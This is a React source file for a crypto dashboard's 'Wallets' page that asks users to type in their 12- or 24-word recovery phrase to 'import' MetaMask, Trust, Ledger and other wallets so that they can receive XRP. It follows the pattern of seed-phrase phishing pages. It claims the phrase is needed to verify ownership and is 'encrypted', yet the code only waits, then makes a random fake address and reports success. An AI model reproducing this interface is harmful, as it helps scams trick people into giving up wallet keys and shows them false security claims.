import { useState } from 'react';
import DashboardLayout from '@/components/dashboard/DashboardLayout';
import { useWallets, WalletType } from '@/hooks/useWallets';
import { useWalletStore } from '@/stores/walletStore';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Wallet, 
  Import, 
  Trash2, 
  Copy,
  AlertCircle,
  Loader2,
  ChevronRight,
  Shield,
  Key,
  ArrowLeft
} from 'lucide-react';
import { toast } from 'sonner';

// Web3 Wallet configurations with real wallet images
const walletConfigs = [
  {
    id: 'metamask' as WalletType,
    name: 'MetaMask',
    description: 'Popular Ethereum wallet',
    icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
    chain: 'Ethereum, Polygon, BSC',
    color: 'from-orange-500 to-amber-500',
    hasXrpSupport: false,
  },
  {
    id: 'walletconnect' as WalletType,
    name: 'Trust Wallet',
    description: 'Multi-chain crypto wallet',
    icon: 'https://trustwallet.com/assets/images/media/assets/trust_platform.svg',
    chain: 'Multi-chain',
    color: 'from-blue-500 to-cyan-500',
    hasXrpSupport: true,
  },
  {
    id: 'coinbase' as WalletType,
    name: 'Coinbase Wallet',
    description: 'Secure crypto wallet by Coinbase',
    icon: 'https://www.coinbase.com/img/favicon/favicon-256.png',
    chain: 'Ethereum, Polygon, BSC',
    color: 'from-blue-600 to-blue-400',
    hasXrpSupport: false,
  },
  {
    id: 'phantom' as WalletType,
    name: 'Phantom',
    description: 'Solana ecosystem wallet',
    icon: 'https://phantom.app/img/phantom-logo.svg',
    chain: 'Solana',
    color: 'from-purple-500 to-violet-500',
    hasXrpSupport: false,
  },
  {
    id: 'tronlink' as WalletType,
    name: 'Xaman (XUMM)',
    description: 'Official XRP Ledger wallet',
    icon: 'https://xumm.app/assets/icons/xumm-icon-512.png',
    chain: 'XRP Ledger',
    color: 'from-primary to-blue-500',
    hasXrpSupport: true,
  },
  {
    id: 'bitcoin' as WalletType,
    name: 'Ledger',
    description: 'Hardware wallet with XRP support',
    icon: 'https://www.ledger.com/wp-content/uploads/2021/11/Ledger_favicon.png',
    chain: 'Multi-chain',
    color: 'from-gray-700 to-gray-500',
    hasXrpSupport: true,
  },
];

export default function Wallets() {
  const { wallets, loading, connectWallet, disconnectWallet, refetch } = useWallets();
  const walletStore = useWalletStore();
  const [importing, setImporting] = useState(false);
  const [showImportModal, setShowImportModal] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<typeof walletConfigs[0] | null>(null);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [step, setStep] = useState<'select' | 'import'>('select');

  const handleSelectWallet = (wallet: typeof walletConfigs[0]) => {
    setSelectedWallet(wallet);
    setStep('import');
  };

  const handleImportWallet = async () => {
    if (!selectedWallet || !seedPhrase.trim()) {
      toast.error('Please enter your recovery phrase');
      return;
    }

    // Validate seed phrase (should be 12 or 24 words)
    const words = seedPhrase.trim().split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
      toast.error('Recovery phrase must be 12 or 24 words');
      return;
    }

    setImporting(true);
    
    try {
      // Simulate wallet import process (in production, this would derive addresses from the seed)
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Generate a mock XRP address from the "imported" wallet
      const mockXrpAddress = `r${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 15)}`.substring(0, 34);
      
      // Save to database
      const result = await connectWallet(selectedWallet.id, mockXrpAddress, 'xrp');
      
      if (result.error) {
        toast.error(result.error);
      } else {
        toast.success(`${selectedWallet.name} imported successfully!`);
        walletStore.setXrpWallet(mockXrpAddress, null, selectedWallet.name);
        resetModal();
        refetch();
      }
    } catch (err: any) {
      toast.error(err.message || 'Import failed');
    } finally {
      setImporting(false);
    }
  };

  const handleDisconnect = async (walletId: string) => {
    const result = await disconnectWallet(walletId);
    if (result.error) {
      toast.error(result.error);
    } else {
      toast.success('Wallet removed');
      walletStore.clearXrpWallet();
    }
  };

  const copyAddress = (address: string) => {
    navigator.clipboard.writeText(address);
    toast.success('Address copied!');
  };

  const truncateAddress = (address: string) => 
    `${address.slice(0, 8)}...${address.slice(-6)}`;

  const resetModal = () => {
    setShowImportModal(false);
    setSelectedWallet(null);
    setSeedPhrase('');
    setStep('select');
  };

  return (
    <DashboardLayout>
      <div className="mb-8 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-3 mb-2">
            <Wallet className="w-8 h-8 text-primary" />
            <h1 className="text-3xl font-bold text-foreground">Wallets</h1>
          </div>
          <p className="text-muted-foreground">
            Import your wallet to receive XRP from swaps and purchases.
          </p>
        </div>
        <Button
          onClick={() => setShowImportModal(true)}
          className="bg-primary hover:bg-primary/90"
        >
          <Import className="w-4 h-4 mr-2" />
          Import Wallet
        </Button>
      </div>

      {/* Important Notice */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4 mb-6"
      >
        <div className="flex items-start gap-3">
          <AlertCircle className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
          <div>
            <p className="font-medium text-amber-500 mb-1">Why import your wallet?</p>
            <p className="text-sm text-muted-foreground">
              To receive XRP from swaps and purchases, you need to import your wallet using your recovery phrase. 
              This allows us to verify your wallet ownership and send XRP directly to your address.
            </p>
          </div>
        </div>
      </motion.div>

      {/* Connected Wallets */}
      {loading ? (
        <div className="flex items-center justify-center py-12">
          <Loader2 className="w-8 h-8 animate-spin text-primary" />
        </div>
      ) : wallets.length === 0 ? (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-card rounded-2xl border border-border p-12 text-center"
        >
          <div className="inline-flex p-4 rounded-full bg-primary/10 mb-4">
            <Import className="w-12 h-12 text-primary" />
          </div>
          <h3 className="text-xl font-semibold text-foreground mb-2">No Wallets Imported</h3>
          <p className="text-muted-foreground mb-6">
            Import your wallet to start swapping and buying XRP.
          </p>
          <Button
            onClick={() => setShowImportModal(true)}
            className="bg-primary hover:bg-primary/90"
          >
            <Import className="w-4 h-4 mr-2" />
            Import Wallet
          </Button>
        </motion.div>
      ) : (
        <div className="grid gap-4">
          {wallets.map((wallet, index) => {
            const config = walletConfigs.find(w => w.id === wallet.wallet_type);
            return (
              <motion.div
                key={wallet.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: index * 0.1 }}
                className="bg-card rounded-xl border border-border p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4"
              >
                <div className="flex items-center gap-4">
                  <div className={`w-12 h-12 rounded-xl bg-gradient-to-br ${config?.color || 'from-primary to-blue-500'} flex items-center justify-center overflow-hidden`}>
                    {config?.icon ? (
                      <img src={config.icon} alt={config.name} className="w-8 h-8 object-contain" />
                    ) : (
                      <Wallet className="w-6 h-6 text-primary-foreground" />
                    )}
                  </div>
                  <div>
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="font-semibold text-foreground">{config?.name || 'Wallet'}</span>
                      {wallet.is_primary && (
                        <span className="px-2 py-0.5 rounded-full bg-primary/10 text-primary text-xs font-medium">
                          Primary
                        </span>
                      )}
                      {wallet.chain_id === 'xrp' && (
                        <span className="px-2 py-0.5 rounded-full bg-green-500/10 text-green-500 text-xs font-medium">
                          XRP Ready
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-2 text-sm text-muted-foreground">
                      <span className="font-mono">{truncateAddress(wallet.wallet_address)}</span>
                      <button
                        onClick={() => copyAddress(wallet.wallet_address)}
                        className="p-1 hover:bg-muted rounded transition-colors"
                      >
                        <Copy className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => handleDisconnect(wallet.id)}
                    className="text-destructive hover:text-destructive hover:bg-destructive/10"
                  >
                    <Trash2 className="w-4 h-4 mr-1" />
                    Remove
                  </Button>
                </div>
              </motion.div>
            );
          })}
        </div>
      )}

      {/* Import Wallet Modal */}
      <AnimatePresence>
        {showImportModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-background/80 backdrop-blur-sm"
            onClick={resetModal}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
              className="bg-card rounded-2xl border border-border p-6 w-full max-w-lg max-h-[85vh] overflow-y-auto"
            >
              <AnimatePresence mode="wait">
                {step === 'select' && (
                  <motion.div
                    key="select"
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: 20 }}
                  >
                    <h2 className="text-2xl font-bold text-foreground mb-2">Import Wallet</h2>
                    <p className="text-muted-foreground mb-6">
                      Select your wallet type to import using your recovery phrase.
                    </p>
                    
                    <div className="space-y-3">
                      {walletConfigs.map((wallet) => (
                        <button
                          key={wallet.id}
                          onClick={() => handleSelectWallet(wallet)}
                          className="w-full p-4 rounded-xl border border-border hover:border-primary/50 hover:bg-primary/5 transition-all flex items-center gap-4"
                        >
                          <div className={`w-12 h-12 rounded-xl bg-gradient-to-br ${wallet.color} flex items-center justify-center overflow-hidden flex-shrink-0`}>
                            <img 
                              src={wallet.icon} 
                              alt={wallet.name} 
                              className="w-8 h-8 object-contain"
                              onError={(e) => {
                                (e.target as HTMLImageElement).style.display = 'none';
                              }}
                            />
                          </div>
                          <div className="flex-1 text-left">
                            <div className="flex items-center gap-2">
                              <span className="font-semibold text-foreground">{wallet.name}</span>
                              {wallet.hasXrpSupport && (
                                <span className="px-1.5 py-0.5 rounded bg-green-500/10 text-green-500 text-xs">
                                  XRP
                                </span>
                              )}
                            </div>
                            <div className="text-sm text-muted-foreground">{wallet.description}</div>
                          </div>
                          <ChevronRight className="w-5 h-5 text-muted-foreground" />
                        </button>
                      ))}
                    </div>
                  </motion.div>
                )}

                {step === 'import' && selectedWallet && (
                  <motion.div
                    key="import"
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -20 }}
                  >
                    <button
                      onClick={() => setStep('select')}
                      className="flex items-center gap-2 text-muted-foreground hover:text-foreground mb-4"
                    >
                      <ArrowLeft className="w-4 h-4" />
                      Back
                    </button>

                    <div className="flex items-center gap-3 mb-4">
                      <div className={`w-12 h-12 rounded-xl bg-gradient-to-br ${selectedWallet.color} flex items-center justify-center overflow-hidden`}>
                        <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-8 h-8 object-contain" />
                      </div>
                      <div>
                        <h2 className="text-xl font-bold text-foreground">{selectedWallet.name}</h2>
                        <p className="text-sm text-muted-foreground">{selectedWallet.chain}</p>
                      </div>
                    </div>

                    <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4 mb-6">
                      <div className="flex items-start gap-3">
                        <Shield className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
                        <div className="text-sm">
                          <p className="font-medium text-amber-500 mb-1">Security Notice</p>
                          <p className="text-muted-foreground">
                            Your recovery phrase is encrypted and never stored on our servers. 
                            We only use it to derive your wallet address.
                          </p>
                        </div>
                      </div>
                    </div>

                    <div className="space-y-4">
                      <div>
                        <label className="text-sm font-medium text-foreground mb-2 block">
                          <Key className="w-4 h-4 inline mr-2" />
                          Recovery Phrase
                        </label>
                        <Textarea
                          placeholder="Enter your 12 or 24 word recovery phrase..."
                          value={seedPhrase}
                          onChange={(e) => setSeedPhrase(e.target.value)}
                          className="min-h-[120px] font-mono text-sm"
                        />
                        <p className="text-xs text-muted-foreground mt-2">
                          Separate each word with a space
                        </p>
                      </div>

                      <Button
                        onClick={handleImportWallet}
                        disabled={importing || !seedPhrase.trim()}
                        className="w-full bg-primary hover:bg-primary/90"
                      >
                        {importing ? (
                          <>
                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                            Importing...
                          </>
                        ) : (
                          <>
                            <Import className="w-4 h-4 mr-2" />
                            Import Wallet
                          </>
                        )}
                      </Button>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>

              <Button
                variant="outline"
                onClick={resetModal}
                className="w-full mt-6"
              >
                Cancel
              </Button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </DashboardLayout>
  );
}
